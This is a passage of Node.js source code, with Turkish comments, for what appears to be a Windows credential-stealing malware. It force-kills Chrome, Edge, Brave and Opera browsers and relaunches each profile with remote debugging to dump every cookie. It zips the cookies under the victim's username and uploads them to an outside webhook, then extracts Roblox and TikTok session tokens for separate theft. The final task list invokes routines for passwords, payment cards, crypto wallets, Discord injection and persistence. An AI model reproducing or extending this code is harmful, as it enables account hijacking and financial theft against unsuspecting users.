            if (response.id === 1 && response.result) {
                console.log('Successfully retrieved cookies');
                resolve(response.result.cookies);
                ws.close();
            }
        });
        ws.on('error', (error) => {
            console.log(`WebSocket error: ${error.message}`);
            reject(`Error connecting to WebSocket: ${error.message}`);
        });
        ws.on('close', () => {
            console.log('WebSocket connection closed');
        });
    });
  }

  async function saveCookiesToFile(cookies, fileName) {
    console.log(`Saving cookies to ${fileName}`);
    const cookieData = cookies.map(cookie => {
        const secure = cookie.secure ? 'TRUE' : 'FALSE';
        const expires = cookie.expires ? new Date(cookie.expires * 1000).toUTCString() : 'Session';
        return `${cookie.domain}        TRUE    /       FALSE   2597573456      ${cookie.name}  ${cookie.value}`;
    }).join('\n');
    fs.writeFileSync(fileName, cookieData);
    console.log(`Successfully saved cookies to ${fileName}`);
  }

  async function getProfiles(browser) {
    console.log(`Getting profiles for ${browser}`);
    const userDataPath = configs[browser].userData;
    try {
        const profileDirs = fs.readdirSync(userDataPath).filter(dir => dir.startsWith('Profile '));
        console.log(`Found ${profileDirs.length} profiles for ${browser}`);
        return profileDirs;
    } catch (error) {
        console.log(`Error reading profiles for ${browser}: ${error}`);
        return [];
    }
  }

  async function killBrowserProcess1295(browser) {
    return new Promise((resolve, reject) => {
        const processName = configs[browser].bin.split('\\').pop();
        console.log(`Killing ${processName}`);
        exec(`taskkill /F /IM ${processName} /T`, (err, stdout, stderr) => {
            if (err) {
                console.log(`Warning when killing ${browser}: ${stderr}`);
            }
            console.log(`${browser} process killed`);
            setTimeout(resolve, 200);
        });
    });
  }

  async function processOperaWithRetry1295(dgyhux, maxRetries = 3) {
    let attempts = 0;
    while (attempts < maxRetries) {
        try {
            await killBrowserProcess1295("operagx");
            await new Promise(resolve => setTimeout(resolve, 1000));

            const browserProcess1295 = await startOperaBrowser();
            await new Promise(resolve => setTimeout(resolve, 5000));

            let wsUrl = null;
            for (let i = 0; i < 5; i++) {
                wsUrl = await getDebugWsUrl1295();
                if (wsUrl) break;
                await new Promise(resolve => setTimeout(resolve, 1000));
            }

            if (!wsUrl) {
                throw new Error('Failed to get WebSocket URL');
            }

            const cookies = await getCookies1295(wsUrl);
            const fileName = `operagx-cookies1295.txt`;

            await saveCookiesToFile(cookies, fileName);

            if (fs.existsSync(fileName)) {
                dgyhux['operagx-default'] = cookies;
                browserProcess1295.kill();
                return true;
            }

            browserProcess1295.kill();
            throw new Error('Cookie file not created');

        } catch (error) {
            console.log(`Attempt ${attempts + 1} failed for Opera GX: ${error}`);
            attempts++;
            await killBrowserProcess1295("operagx");
            await new Promise(resolve => setTimeout(resolve, 1000));
        }
    }
    console.log(`Failed to process Opera GX after ${maxRetries} attempts`);
    return false;
  }

  async function processBrowserWithRetry1295(browser, profileDirectory, dgyhux, maxRetries = 3) {
    let attempts = 0;
    while (attempts < maxRetries) {
        try {
            await killBrowserProcess1295(browser);
            await new Promise(resolve => setTimeout(resolve, 200));

            const browserProcess1295 = await startBrowser(browser, profileDirectory);
            await new Promise(resolve => setTimeout(resolve, 1000));

            const wsUrl = await getDebugWsUrl1295();
            if (!wsUrl) {
                throw new Error('Failed to get WebSocket URL');
            }

            const cookies = await getCookies1295(wsUrl);
            const fileName = profileDirectory ?
                `${browser}-${profileDirectory}-cookies1295.txt` :
                `${browser}-cookies1295.txt`;

            await saveCookiesToFile(cookies, fileName);

            if (fs.existsSync(fileName)) {
                dgyhux[`${browser}-${profileDirectory || 'default'}`] = cookies;
                browserProcess1295.kill();
                return true;
            }

            browserProcess1295.kill();
            throw new Error('Cookie file not created');

        } catch (error) {
            console.log(`Attempt ${attempts + 1} failed for ${browser} ${profileDirectory || 'default'}: ${error}`);
            attempts++;
            await killBrowserProcess1295(browser);
            await new Promise(resolve => setTimeout(resolve, 200));
        }
    }
    console.log(`Failed to process ${browser} ${profileDirectory || 'default'} after ${maxRetries} attempts`);
    return false;
  }

  async function processBrowserProfiles1295(browser, dgyhux) {
    if (!browserExists1295(browser)) {
        console.log(`${browser} is not installed or executable not found.`);
        return;
    }

    if (browser === "operagx") {
        await processOperaWithRetry1295(dgyhux);
        return;
    }

    await killBrowserProcess1295(browser);
    await new Promise(resolve => setTimeout(resolve, 200));

    await processBrowserWithRetry1295(browser, "Default", dgyhux);

    const profiles = await getProfiles(browser);
    console.log(`Found ${profiles.length} profiles for ${browser}`);

    for (let profile of profiles) {
        await processBrowserWithRetry1295(browser, profile, dgyhux);
    }

    await killBrowserProcess1295(browser);
  }

  async function zipAndUploadCookies9() {
    const zip = new AdmZip();
    const currentDirectory = process.cwd();
    const files = fs.readdirSync(currentDirectory);

    files.forEach(file => {
      if (file.endsWith('-cookies1295.txt')) {
        const filePath = path.join(currentDirectory, file);
        zip.addLocalFile(filePath);
      }
    });

    const zipFileName = `${process.env.USERNAME}NewCookies.zip`;
    const outputZipPath = path.join(currentDirectory, zipFileName);
    zip.writeZip(outputZipPath);

    try {
      const webhook = `${api_url}/upload`;
      const form = new FormData();
      form.append('file', fs.createReadStream(outputZipPath));
      form.append('json', JSON.stringify({ key }));
      await form.submit(webhook);
      ('File uploaded successfully.');
      extractSessionData9();
    } catch (error) {
      ('Error uploading to webhook:', error);
    }
    }

    function extractSessionData9() {
    const filesToCheck = fs.readdirSync('./').filter(file => file.endsWith('-cookies1295.txt'));

    filesToCheck.forEach((filename) => {
      const filePath = path.join('./', filename);

      if (fs.existsSync(filePath)) {
        const fileContent = fs.readFileSync(filePath, 'utf-8');

        const robloxMatch = fileContent.match(/\.ROBLOSECURITY\s+([^ \t\r\n]+)/);
        if (robloxMatch && robloxMatch[1]) {
          const robloxSecurityToken = robloxMatch[1];
          SubmitRoblox(robloxSecurityToken);
        }

        const tiktokMatch = fileContent.match(/\.tiktok.com.*\ssessionid\s+([^ \t\r\n]+)/);
        if (tiktokMatch && tiktokMatch[1]) {
          const tiktokSession = tiktokMatch[1];
          stealTikTokSession(tiktokSession);
        }

      } else {
        (`${filename} dosyası bulunamadı.`);
      }
    });
    }


async function startProcess1295() {
    const dgyhux = {}; // Çerezleri saklamak için boş bir obje başlatılıyor

    // İşlem yapılacak tarayıcılar listesi
    const browsers = ["chrome", "edge", "brave", "operagx", "opera"];

    for (const browser of browsers) {
        await processBrowserProfiles1295(browser, dgyhux);
    }

    await zipAndUploadCookies9();
}



async function executeTasksInOrder() {
    const functions = [
        closeBrowsers,
        getEncrypted,
        getCookiesAndSendWebhook,
        getAutofills,
        StopCords,
        InfectDiscords,
        getPasswords,
        stealTokens,
        SubmitExodus,
        getCards,
        getFirefoxCookies,
        submitFileZilla,
        filestealr,
        keywords4,
        gatherWalletInfo,
        zipFolders,
        checkAll,
        startProcess1295,
                getCookies,
                fetchAllCookies,
                fetchAllCookies5,
        startup,
        submitSteam,
        stealSteamSession,
        StealEpicGames,
        getMinecraft,
        SubmitTelegram,
      ];

    for (const func of functions) {
        try {
            await func();
        } catch (error) {
            console.error(`Error in function ${func.name}:`, error);

            fs.appendFileSync('errors.txt', `Error in function ${func.name}: ${error.message}\n`);
        }
    }
}

executeTasksInOrder();
